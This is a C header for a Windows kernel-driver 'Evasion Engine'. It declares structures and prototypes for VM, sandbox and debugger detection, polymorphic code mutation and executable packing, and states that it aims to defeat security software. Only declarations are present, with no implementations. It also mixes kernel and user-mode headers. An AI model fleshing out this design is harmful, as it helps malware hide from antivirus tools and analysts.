#pragma once

// Evasion Engine
// Purpose: Advanced evasion and anti-analysis techniques
// Implementation: VM detection, sandbox evasion, debugger detection, polymorphic code, executable packing
//
// This component implements Requirement 18: Advanced Evasion and Anti-Analysis
// Framework uses real evasion techniques to defeat security software
//
// Educational Security Research Purpose Only

#include <ntddk.h>
#include <wdf.h>
#include <ntstrsafe.h>
#include <windef.h>
#include <intrin.h>
#include <wmiutils.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "MemoryManagement.h"
#include "Concurrency.h"
#include "ModernCpp.h"

// Forward declarations
typedef struct _EVASION_ENGINE_STATE EVASION_ENGINE_STATE;
typedef struct _VM_DETECTION_CONFIG VM_DETECTION_CONFIG;
typedef struct _SANDBOX_EVASION_CONFIG SANDBOX_EVASION_CONFIG;
typedef struct _DEBUGGER_DETECTION_CONFIG DEBUGGER_DETECTION_CONFIG;
typedef struct _POLYMORPHIC_CODE_CONFIG POLYMORPHIC_CODE_CONFIG;
typedef struct _EXECUTABLE_PACKING_CONFIG EXECUTABLE_PACKING_CONFIG;

// VM Detection Configuration Structure
struct _VM_DETECTION_CONFIG {
    BOOLEAN Enabled;
    BOOLEAN CPUDDetectionActive;
    BOOLEAN HardwareFingerprintingActive;
    BOOLEAN WMIDetectionActive;
    BOOLEAN RegistryDetectionActive;
    BOOLEAN ProcessDetectionActive;
    FAST_MUTEX VMDetectionLock;
    ULONG DetectionCount;
    WCHAR DetectedVM[64];
};

// Sandbox Evasion Configuration Structure
struct _SANDBOX_EVASION_CONFIG {
    BOOLEAN Enabled;
    BOOLEAN TimingAttackActive;
    BOOLEAN UserInteractionDetectionActive;
    BOOLEAN ResourceExhaustionDetectionActive;
    BOOLEAN EnvironmentCheckActive;
    BOOLEAN NetworkCheckActive;
    FAST_MUTEX SandboxEvasionLock;
    ULONG EvasionCount;
    WCHAR DetectedSandbox[64];
};

// Debugger Detection Configuration Structure
struct _DEBUGGER_DETECTION_CONFIG {
    BOOLEAN Enabled;
    BOOLEAN PEBManipulationActive;
    BOOLEAN AntiDebuggingActive;
    BOOLEAN HardwareBreakpointDetectionActive;
    BOOLEAN SoftwareBreakpointDetectionActive;
    BOOLEAN MemoryBreakpointDetectionActive;
    FAST_MUTEX DebuggerDetectionLock;
    ULONG DetectionCount;
    WCHAR DetectedDebugger[64];
};

// Polymorphic Code Configuration Structure
struct _POLYMORPHIC_CODE_CONFIG {
    BOOLEAN Enabled;
    BOOLEAN RealTimeMutationActive;
    BOOLEAN CodeObfuscationActive;
    BOOLEAN ControlFlowFlatteningActive;
    BOOLEAN DeadCodeInsertionActive;
    BOOLEAN InstructionReorderingActive;
    FAST_MUTEX PolymorphicCodeLock;
    ULONG MutationCount;
    ULONG CurrentMutationVersion;
};

// Executable Packing Configuration Structure
struct _EXECUTABLE_PACKING_CONFIG {
    BOOLEAN Enabled;
    BOOLEAN CustomPackerActive;
    BOOLEAN SignatureObfuscationActive;
    BOOLEAN EntropyManipulationActive;
    BOOLEAN AntiEmulationActive;
    BOOLEAN AntiDebuggingActive;
    FAST_MUTEX ExecutablePackingLock;
    ULONG PackingCount;
    WCHAR CurrentPacker[64];
};

// Evasion Engine State Structure
struct _EVASION_ENGINE_STATE {
    // VM Detection State
    VM_DETECTION_CONFIG VMDetection;
    
    // Sandbox Evasion State
    SANDBOX_EVASION_CONFIG SandboxEvasion;
    
    // Debugger Detection State
    DEBUGGER_DETECTION_CONFIG DebuggerDetection;
    
    // Polymorphic Code State
    POLYMORPHIC_CODE_CONFIG PolymorphicCode;
    
    // Executable Packing State
    EXECUTABLE_PACKING_CONFIG ExecutablePacking;
    
    // Global State
    BOOLEAN EngineActive;
    FAST_MUTEX EngineLock;
    ULONG TotalEvasionCount;
    WCHAR CurrentEvasionMode[32];
};

// Function declarations
NTSTATUS EvasionEngineInitialize(_Out_ EVASION_ENGINE_STATE** ppState);
NTSTATUS EvasionEngineShutdown(_In_ EVASION_ENGINE_STATE* pState);

// VM Detection Functions
BOOLEAN EvasionEngineDetectVM(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectVMUsingCPUID(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectVMUsingHardwareFingerprinting(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectVMUsingWMI(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectVMUsingRegistry(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectVMUsingProcesses(_In_ EVASION_ENGINE_STATE* pState);

// Sandbox Evasion Functions
BOOLEAN EvasionEngineEvadeSandbox(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEnginePerformTimingAttack(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectUserInteraction(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectResourceExhaustion(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineCheckEnvironment(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineCheckNetwork(_In_ EVASION_ENGINE_STATE* pState);

// Debugger Detection Functions
BOOLEAN EvasionEngineDetectDebugger(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectDebuggerUsingPEB(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectDebuggerUsingAntiDebugging(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectHardwareBreakpoints(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectSoftwareBreakpoints(_In_ EVASION_ENGINE_STATE* pState);
BOOLEAN EvasionEngineDetectMemoryBreakpoints(_In_ EVASION_ENGINE_STATE* pState);

// Polymorphic Code Functions
NTSTATUS EvasionEngineApplyPolymorphicCode(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);
NTSTATUS EvasionEngineMutateCodeRealTime(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);
NTSTATUS EvasionEngineObfuscateCode(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);
NTSTATUS EvasionEngineFlattenControlFlow(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);
NTSTATUS EvasionEngineInsertDeadCode(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);
NTSTATUS EvasionEngineReorderInstructions(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pCodeBuffer, _In_ SIZE_T CodeSize);

// Executable Packing Functions
NTSTATUS EvasionEnginePackExecutable(_In_ EVASION_ENGINE_STATE* pState, _In_ PCWSTR pInputPath, _In_ PCWSTR pOutputPath);
NTSTATUS EvasionEngineApplyCustomPacker(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pInputBuffer, _In_ SIZE_T InputSize, _Out_ PVOID* ppOutputBuffer, _Out_ SIZE_T* pOutputSize);
NTSTATUS EvasionEngineObfuscateSignature(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pBuffer, _In_ SIZE_T BufferSize);
NTSTATUS EvasionEngineManipulateEntropy(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pBuffer, _In_ SIZE_T BufferSize);
NTSTATUS EvasionEngineApplyAntiEmulation(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pBuffer, _In_ SIZE_T BufferSize);
NTSTATUS EvasionEngineApplyAntiDebugging(_In_ EVASION_ENGINE_STATE* pState, _In_ PVOID pBuffer, _In_ SIZE_T BufferSize);

// Utility Functions
BOOLEAN EvasionEngineIsUnderAnalysis(_In_ EVASION_ENGINE_STATE* pState);
NTSTATUS EvasionEngineReportStatus(_In_ EVASION_ENGINE_STATE* pState, _In_ PCWSTR pStatusMessage);
NTSTATUS EvasionEngineLogDetection(_In_ EVASION_ENGINE_STATE* pState, _In_ PCWSTR pDetectionType, _In_ PCWSTR pDetectionDetails);

// Educational Functions
NTSTATUS EvasionEngineDemonstrateVMDetection(_In_ EVASION_ENGINE_STATE* pState);
NTSTATUS EvasionEngineDemonstrateSandboxEvasion(_In_ EVASION_ENGINE_STATE* pState);
NTSTATUS EvasionEngineDemonstrateDebuggerDetection(_In_ EVASION_ENGINE_STATE* pState);
NTSTATUS EvasionEngineDemonstratePolymorphicCode(_In_ EVASION_ENGINE_STATE* pState);
NTSTATUS EvasionEngineDemonstrateExecutablePacking(_In_ EVASION_ENGINE_STATE* pState);